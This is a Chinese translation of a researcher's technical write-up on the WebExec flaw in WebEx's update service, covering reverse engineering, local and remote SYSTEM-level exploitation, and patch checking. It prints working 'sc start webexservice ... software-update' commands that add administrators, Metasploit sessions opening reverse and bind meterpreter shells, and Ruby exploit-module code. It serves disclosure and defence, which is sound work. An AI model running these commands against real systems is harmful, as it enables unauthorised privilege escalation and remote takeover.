# WebExec漏洞原理与分析浅谈

阅读量 **245680**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-10-29 11:30:24

 **x**

##### 译文声明

本文是翻译文章，文章来源：skullsecurity.org

原文地址：<https://blog.skullsecurity.org/2018/technical-rundown-of-webexec>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01599786866a4efdb8.jpg)

本文是WebExec漏洞发现和工作原理的技术writeup。

研究人员在渗透测试过程中发现WebEx的`WebexUpdateService`存在漏洞——`WebExec`，攻击者利用该漏洞可以允许任何人登陆用户远程执行`SYSTEM`级代码。不同于一般远程代码执行漏洞的是，没有监听任何端口的客户端应用也可能存在远程代码执行漏洞。可以通过WebEx客户端的一个组件在WebEx没有监听远程连接的情况下远程执行代码。

## 简介

研究人员是在最近的一次渗透测试过程中发现的该漏洞，最初的测试目标是提升本地标准用户账户的权限，但发现了该远程代码执行漏洞，研究人员将其命名为WebExec。

WebEx的最新客户端版本是2018年8月的Version 3211.0.1801.2200,
最后修改日期2018年7月19日，SHA1值为`bf8df54e2f49d06b52388332938f5a875c43a5a7`。研究人员已经测试了许多新的和旧的版本，但都存在漏洞。

## 权限提升

研究人员发现文件夹`c:ProgramDataWebExWebExApplications`的权限很奇怪，任何人都可以进行读写，文件夹中安装了一个名为webexservice的服务，任何人都可以开始和停止该服务。

一个常见的测试方式是用`.exe`替换另一个白名单中的应用`msbuild.exe`，因为它读取相同目录中的
`.vbproj`文件的任意C#代码。因为这是一个服务，在工作目录`c:windowssystem32`下运行，所以研究人员不能向该文件夹写入。

## WebExService.exe

研究人员使用IDA来分析`WebExService.exe`。IDA中有两个简单的方法可以找出进程做了什么，分别是strings窗口和imports窗口。对webexservice.exe来说，大多数的字符串都与Windows服务相关。

    
    
      .rdata:00405438 ; wchar_t aSCreateprocess
      .rdata:00405438 aSCreateprocess:                        ; DATA XREF: sub_4025A0+1E8o
      .rdata:00405438                 unicode 0, <%s::CreateProcessAsUser:%d;%ls;%ls(%d).>,0
    

研究人员在advapi32.dll中发现引入了CreateProcessAsUserW，下面看一下具体是怎么被调用的：

    
    
      .text:0040254E                 push    [ebp+lpProcessInformation] ; lpProcessInformation
      .text:00402554                 push    [ebp+lpStartupInfo] ; lpStartupInfo
      .text:0040255A                 push    0               ; lpCurrentDirectory
      .text:0040255C                 push    0               ; lpEnvironment
      .text:0040255E                 push    0               ; dwCreationFlags
      .text:00402560                 push    0               ; bInheritHandles
      .text:00402562                 push    0               ; lpThreadAttributes
      .text:00402564                 push    0               ; lpProcessAttributes
      .text:00402566                 push    [ebp+lpCommandLine] ; lpCommandLine
      .text:0040256C                 push    0               ; lpApplicationName
      .text:0040256E                 push    [ebp+phNewToken] ; hToken
      .text:00402574                 call    ds:CreateProcessAsUserW
    

末尾的W表示函数的UNICODE（wide）版本。在开发Windows代码时，开发者在代码中会使用`CreateProcessAsUser`，编译器会将其扩展为`CreateProcessAsUserA
（ASCII）`和`CreateProcessAsUserW（UNICODE）`。函数中两个最重要的参数是`hToken`和`lpCommandLine`。hToken是创建进程的用户，lpCommandLine是真实运行的命令。

###  hToken

hToken中的代码非常简单。查看调用`CreateProcessAsUserW`，就可以看到其动作执行的整个过程。

函数的顶部是：

    
    
      .text:0040241E                 call    ds:CreateToolhelp32Snapshot
    

这是在win32中搜索特定进程的一种普通方法，会创建运行进程的快照并用`Process32FirstW`和`Process32NextW`进行检查。研究人员曾经在用相同的技术写过一个注入工具将传统dll加载到其他进程中。

基于研究人员对API的了解，可以推测其在搜索特定进程。如果继续往下看，就可以找到调用了`_wcsicmp`，这个函数是`stricmp`所对应的`Unicode`系列的函数。

    
    
      .text:00402480                 lea     eax, [ebp+Str1]
      .text:00402486                 push    offset Str2     ; "winlogon.exe"
      .text:0040248B                 push    eax             ; Str1
      .text:0040248C                 call    ds:_wcsicmp
      .text:00402492                 add     esp, 8
      .text:00402495                 test    eax, eax
      .text:00402497                 jnz     short loc_4024BE
    

然后将每个进程名与`winlogon.exe`进行比对，也就是在获取到`winlogon.exe`进程的句柄。继续函数就可以看到分别顺序调用了`OpenProcess，OpenProcessToken和DuplicateTokenEx`。这是另一个常见的API调用序列，也就是进程如何获取另一个进程token的句柄。之后，复制的token会被传递给`CreateProcessAsUserW`作为`hToken`。

总结一下就是，该函数获取了`winlogon.exe`的handle，复制了其token，以相同用户`SYSTEM`创建了一个新的进程。现在需要做的就是找出进程是什么。一种简单的方法就是看API调用的顺序。

###  lpCommandLine

lpCommandLine的分析有一些复杂。研究人员使用了逆向、调试、故障检测、事件日志等方式来准确找出lpCommandLine的来源。

研究人员在分析过程中发现有大量的调试字符串和事件日志调用。因此，研究人员觉得可以尝试`Windows event viewer
(eventvwr.msc)`和`sc`进程开启`webexservice`：

    
    
    C:Usersron>sc start webexservice
    
    SERVICE_NAME: webexservice
            TYPE               : 10  WIN32_OWN_PROCESS
            STATE              : 2  START_PENDING
                                    (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
    [...]
    

下面是 WebExService.exe的日志：

    
    
    ExecuteServiceCommand::Not enough command line arguments to execute a service command.
    

在IDA中搜索(alt+T)：

    
    
      .text:004027DC                 cmp     edi, 3
      .text:004027DF                 jge     short loc_4027FD
      .text:004027E1                 push    offset aExecuteservice ; &quot;ExecuteServiceCommand&quot;
      .text:004027E6                 push    offset aSNotEnoughComm ; &quot;%s::Not enough command line arguments t&quot;...
      .text:004027EB                 push    2               ; wType
      .text:004027ED                 call    sub_401770
    

逆向的结果是：将`edit`与`3`比较，如果大于等于就跳转，否则打印需要更多参数。很容易就可以试出来需要2个以上的参数。

    
    
    C:Usersron>sc start webexservice a b
    
    [...]
    

然后检查Event Viewer：

    
    
    ExecuteServiceCommand::Service command not recognized: b.
    

出现错误。继续在IDA中搜索(alt+T)：

    
    
      .text:00402830 loc_402830:                             ; CODE XREF: sub_4027D0+3Dj
      .text:00402830                 push    dword ptr [esi+8]
      .text:00402833                 push    offset aExecuteservice ; "ExecuteServiceCommand"
      .text:00402838                 push    offset aSServiceComman ; "%s::Service command not recognized: %ls"...
      .text:0040283D                 push    2               ; wType
      .text:0040283F                 call    sub_401770
    

发现：

    
    
      .text:004027FD loc_4027FD:                             ; CODE XREF: sub_4027D0+Fj
      .text:004027FD                 push    offset aSoftwareUpdate ; "software-update"
      .text:00402802                 push    dword ptr [esi+8] ; lpString1
      .text:00402805                 call    ds:lstrcmpiW
      .text:0040280B                 test    eax, eax
      .text:0040280D                 jnz     short loc_402830 ; <-- Jumps to the error we saw
      .text:0040280F                 mov     [ebp+var_4], eax
      .text:00402812                 lea     edx, [esi+0Ch]
      .text:00402815                 lea     eax, [ebp+var_4]
      .text:00402818                 push    eax
      .text:00402819                 push    ecx
      .text:0040281A                 lea     ecx, [edi-3]
      .text:0040281D                 call    sub_4025A0
    

字符串`software-update`正是比较的字符串。因此用`software-update`替换`b`看看对不对。  
命令如下：

    
    
    C:Usersron>sc start webexservice a software-update
    
    [...]
    

命令执行会产生一条新的日志记录：

    
    
      Faulting application name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
      Faulting module name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
      Exception code: 0xc0000005
      Fault offset: 0x00002643
      Faulting process id: 0x654
      Faulting application start time: 0x01d42dbbf2bcc9b8
      Faulting application path: C:ProgramDataWebexWebexApplicationsWebExService.exe
      Faulting module path: C:ProgramDataWebexWebexApplicationsWebExService.exe
      Report Id: 31555e60-99af-11e8-8391-0800271677bd
    

研究人员的命令使进程奔溃了。但这里是想尝试使用其特征，因此：  
exception code是`0xc0000005`，表示内存错误。进程尝试访问一个坏的内存地址。

因此研究人员尝试暴力破解，添加更多的命令行参数。研究人员的逻辑是服务可能需要2个参数，但实际上使用的是第三个参数，但第三个参数不存在，所以进程奔溃了。  
因此使用下面的参数：

    
    
    C:Usersron>sc start webexservice a software-update a b c d e f
    
    [...]
    

同样奔溃了:

    
    
      Faulting application name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
      Faulting module name: MSVCR120.dll, version: 12.0.21005.1, time stamp: 0x524f7ce6
      Exception code: 0x40000015
      Fault offset: 0x000a7676
      Faulting process id: 0x774
      Faulting application start time: 0x01d42dbc22eef30e
      Faulting application path: C:ProgramDataWebexWebexApplicationsWebExService.exe
      Faulting module path: C:ProgramDataWebexWebexApplicationsMSVCR120.dll
      Report Id: 60a0439c-99af-11e8-8391-0800271677bd
    

Exception
code变成了`0x40000015`，表示`STATUS_FATAL_APP_EXIT`，也就是说应用程序退出了。因为没有输出，所以无法确定产生错误的真正原因。

下面分析其工作原理：  
根据`software-update`字符串的代码路径，就可以看到下面的函数调用：

    
    
      .text:0040281D                 call    sub_4025A0
    

双击跳转到该函数，可以看到：

    
    
      .text:00402616                 mov     [esp+0B4h+var_70], offset aWinsta0Default ; "winsta0\Default"
    

研究人员用最先进的技术搜索了该字符串，结果是一个默认桌面的句柄，常用于开启一个需要与用户交互的新进程。

在该函数中，研究人员还发现以下代码：

    
    
      .text:004026A2                 push    eax             ; EndPtr
      .text:004026A3                 push    esi             ; Str
      .text:004026A4                 call    ds:wcstod ; <--      .text:004026AA                 add     esp, 8
      .text:004026AD                 fstp    [esp+0B4h+var_90]
      .text:004026B1                 cmp     esi, [esp+0B4h+EndPtr+4]
      .text:004026B5                 jnz     short loc_4026C2
      .text:004026B7                 push    offset aInvalidStodArg ; &quot;invalid stod argument&quot;
      .text:004026BC                 call    ds:?_Xinvalid_argument@std@@YAXPBD@Z ; std::_Xinvalid_argument(char const *)
    

这行有一个错误，`wcstod()`与`abort()`产生的位置很近。`wcstod()`是另一个微软的将字符转化为数字的函数。如果失败，代码会引用`std::_Xinvalid_argument`。

研究人员后来发现之后的参数应该是`1`，因此命令行变成了：

    
    
    C:Usersron>sc start webexservice a software-update 1 2 3 4 5 6
    

检查事件日志：

    
    
      StartUpdateProcess::CreateProcessAsUser:1;1;2 3 4 5 6(18).
    

研究人员将`2`修改为一个真实进程：

    
    
      C:Usersron>sc start webexservice a software-update 1 calc c d e f
    

然后就打开了真实的计算器：

    
    
    C:Usersron>tasklist | find "calc"
    calc.exe                      1476 Console                    1     10,804 K
    

而且是GUI界面以`SYSTEM`权限运行的。

但是以同样的方式运行cmd.exe和powershell却不能工作。

## 本地利用

最简单的利用方式就是用`wmic.exe`打开`cmd.exe`：

    
    
    C:Usersron>sc start webexservice a software-update 1 wmic process call create "cmd.exe"
    

命令会打开一个`SYSTEM`权限的GUI cmd.exe实例：

    
    
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:Windowssystem32>whoami
    nt authoritysystem
    

如果不以GUI方式打开，也可以提权：

    
    
    C:Usersron>net localgroup administrators
    [...]
    Administrator
    ron
    
    C:Usersron>sc start webexservice a software-update 1 net localgroup administrators testuser /add
    [...]
    
    C:Usersron>net localgroup administrators
    [...]
    Administrator
    ron
    testuser
    

Jeff写了一个 Metasploit
本地模块来进行权限提升。如果攻击者在受影响的机器上有非SYSTEM的session，就可以用这种方式来获取SYSTEM账号（权限）：

    
    
    meterpreter > getuid
    Server username: IEWIN7IEUser
    
    meterpreter > background
    [*] Backgrounding session 2...
    
    msf exploit(multi/handler) > use exploit/windows/local/webexec
    msf exploit(windows/local/webexec) > set SESSION 2
    SESSION => 2
    
    msf exploit(windows/local/webexec) > set payload windows/meterpreter/reverse_tcp
    msf exploit(windows/local/webexec) > set LHOST 172.16.222.1
    msf exploit(windows/local/webexec) > set LPORT 9001
    msf exploit(windows/local/webexec) > run
    
    [*] Started reverse TCP handler on 172.16.222.1:9001
    [*] Checking service exists...
    [*] Writing 73802 bytes to %SystemRoot%TempyqaKLvdn.exe...
    [*] Launching service...
    [*] Sending stage (179779 bytes) to 172.16.222.132
    [*] Meterpreter session 2 opened (172.16.222.1:9001 -> 172.16.222.132:49574) at 2018-08-31 14:45:25 -0700
    [*] Service started...
    
    meterpreter > getuid
    Server username: NT AUTHORITYSYSTEM
    

## 远程利用

最简单的漏洞利用可以通过Windows sc命令完成。可以在远程机器上创建一个session或用相同的凭证创建一个本地用户，然后在该用户环境下（`runas
/user:newuser cmd.exe`）运行cmd.exe。完成后，就可以在远程主机上使用相同的命令了：

    
    
    c:>sc \10.0.0.0 start webexservice a software-update 1 net localgroup administrators testuser /add
    

###  利用Metasploit远程利用

为了简化攻击，研究人员写了另外一对Metasploit模块。一个是实现该攻击来远程运行任意命令的辅助模块，另一个是完整的利用模块。两个模块都需要有效的SMB账号（本地或域账户都可以），但主要都依赖于WebExec
library 。

下面是用复制模块来运行计算器的例子：

    
    
    msf5 > use auxiliary/admin/smb/webexec_command
    msf5 auxiliary(admin/smb/webexec_command) > set RHOSTS 192.168.1.100-110
    RHOSTS => 192.168.56.100-110
    msf5 auxiliary(admin/smb/webexec_command) > set SMBUser testuser
    SMBUser => testuser
    msf5 auxiliary(admin/smb/webexec_command) > set SMBPass testuser
    SMBPass => testuser
    msf5 auxiliary(admin/smb/webexec_command) > set COMMAND calc
    COMMAND => calc
    msf5 auxiliary(admin/smb/webexec_command) > exploit
    
    [-] 192.168.56.105:445    - No service handle retrieved
    [+] 192.168.56.105:445    - Command completed!
    [-] 192.168.56.103:445    - No service handle retrieved
    [+] 192.168.56.103:445    - Command completed!
    [+] 192.168.56.104:445    - Command completed!
    [+] 192.168.56.101:445    - Command completed!
    [*] 192.168.56.100-110:445 - Scanned 11 of 11 hosts (100% complete)
    [*] Auxiliary module execution completed
    

下面是完整的利用模块：

    
    
    msf5 > use exploit/windows/smb/webexec
    msf5 exploit(windows/smb/webexec) > set SMBUser testuser
    SMBUser => testuser
    msf5 exploit(windows/smb/webexec) > set SMBPass testuser
    SMBPass => testuser
    msf5 exploit(windows/smb/webexec) > set PAYLOAD windows/meterpreter/bind_tcp
    PAYLOAD => windows/meterpreter/bind_tcp
    msf5 exploit(windows/smb/webexec) > set RHOSTS 192.168.56.101
    RHOSTS => 192.168.56.101
    msf5 exploit(windows/smb/webexec) > exploit
    
    [*] 192.168.56.101:445 - Connecting to the server...
    [*] 192.168.56.101:445 - Authenticating to 192.168.56.101:445 as user 'testuser'...
    [*] 192.168.56.101:445 - Command Stager progress -   0.96% done (999/104435 bytes)
    [*] 192.168.56.101:445 - Command Stager progress -   1.91% done (1998/104435 bytes)
    ...
    [*] 192.168.56.101:445 - Command Stager progress -  98.52% done (102891/104435 bytes)
    [*] 192.168.56.101:445 - Command Stager progress -  99.47% done (103880/104435 bytes)
    [*] 192.168.56.101:445 - Command Stager progress - 100.00% done (104435/104435 bytes)
    [*] Started bind TCP handler against 192.168.56.101:4444
    [*] Sending stage (179779 bytes) to 192.168.56.101
    

从上面的代码可以看出，真实的实现非常直接，但这里要说的是利用模块的一个问题：如何上传一个meterpreter .exe并且运行呢？

研究人员用类psexec的利用将.exe文件上传到可写分区，然后通过WebExec执行。但是上传到share分区一般需要管理员权限，这里可以使用psexec。但这就失去了WebExec的作用。

在与 Egyp7讨论过后，研究人员认为可以用`Msf::Exploit::CmdStager
mixin`。用`.vbs`写一个Base64编码的文件到硬盘，然后解码并执行。

但这种方案也有一些问题：

  * 每行最大长度为1200个字符，而`CmdStager mixin`每行会用2000个字符；
  * `CmdStager`会用`%TEMP%`作为临时目录，但当前利用并不扩展路径；
  * `WebExecService`好像会用反斜杠转义引号，研究人员不清楚如何关闭。

前两个问题很好解决：

    
    
    wexec(true) do |opts|
      opts[:flavor] = :vbs
      opts[:linemax] = datastore["MAX_LINE_LENGTH"]
      opts[:temp] = datastore["TMPDIR"]
      opts[:delay] = 0.05
      execute_cmdstager(opts)
    end
    

execute_cmdstager() 可以执行execute_command() 来构建payload，这里就修复了最后一个问题：

    
    
    # This is the callback for cmdstager, which breaks the full command into
    # chunks and sends it our way. We have to do a bit of finangling to make it
    # work correctly
    def execute_command(command, opts)
      # Replace the empty string, "", with a workaround - the first 0 characters of "A"
      command = command.gsub('""', 'mid(Chr(65), 1, 0)')
    
      # Replace quoted strings with Chr(XX) versions, in a naive way
      command = command.gsub(/"[^"]*"/) do |capture|
        capture.gsub(/"/, "").chars.map do |c|
          "Chr(#{c.ord})"
        end.join('+')
      end
    
      # Prepend "cmd /c" so we can use a redirect
      command = "cmd /c " + command
    
      execute_single_command(command, opts)
    end
    

首先，用空字符串替换`mid(Chr(65), 1, 0)`。  
第二，用`Chr(n)+Chr(n)+....`替换其他字符串。但是不能使用`&`，因为这是shell用来连接命令的。  
最后，将`cmd/c`加到命令之前，这可以将结果输出到文件，也可以用`^>`代替。

## 检查补丁

修复的WebEx也可以使远程用户连接到进程，并启动。但如何进程被检测到正运行一个没有被WebEx签名的可执行文件，执行就会中止。而且研究人员也不清楚主机是否有漏洞。

为了验证代码是否运行，研究人员使用DNS请求、telnet返回特定端口，在webroot中释放文件等方式进行验证。问题是如果没有通用的检查方法，还不如使用脚本呢。

为了利用这一点，研究人员必须要获取到`service-controlservice
(svcctl)`的句柄。因此，研究人员决定安装一个假的服务，尝试启动，然后删除。如果启动服务返回的是`ok`或`ACCESS_DENIED`，就知道代码是否运行了。

下面是研究人员开发的Nmap checker模块的重要代码：

    
    
    -- Create a test service that we can query
    local webexec_command = "sc create " .. test_service .. " binpath= c:\fakepath.exe"
    status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], stdnse.strsplit(" ", "install software-update 1 " .. webexec_command))
    
    -- ...
    
    local test_status, test_result = msrpc.svcctl_openservicew(smbstate, open_result['handle'], test_service, 0x00000)
    
    -- If the service DOES_NOT_EXIST, we couldn't run code
    if string.match(test_result, 'DOES_NOT_EXIST') then
      stdnse.debug("Result: Test service does not exist: probably not vulnerable")
      msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
    
      vuln.check_results = "Could not execute code via WebExService"
      return report:make_output(vuln)
    end
    Not shown: we also delete the service once we're finished.
    

## 总结

WebEx
10月3日发布了补丁，详见webexec.org。好消息是该服务的修复版本只能运行WebEx签名的文件。坏消息是有许多版本都没有修复，而且该服务可以远程启动。

如果不想远程启动该服务，可以用命令关闭：

    
    
    c:>sc sdset webexservice D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
    

这就移除了该服务的远程和非交互式访问。

本文翻译自skullsecurity.org [原文链接](https://blog.skullsecurity.org/2018/technical-rundown-of-webexec)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ang010ela** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/162884](/post/id/162884)

安全客 - 有思想的安全新媒体

本文转载自: [skullsecurity.org](https://blog.skullsecurity.org/2018/technical-rundown-of-webexec)

如若转载,请注明出处： <https://blog.skullsecurity.org/2018/technical-rundown-of-webexec>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [writeup](/tag/writeup)
  * [WebExec](/tag/WebExec)

 **+1** __1赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) ang010ela

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

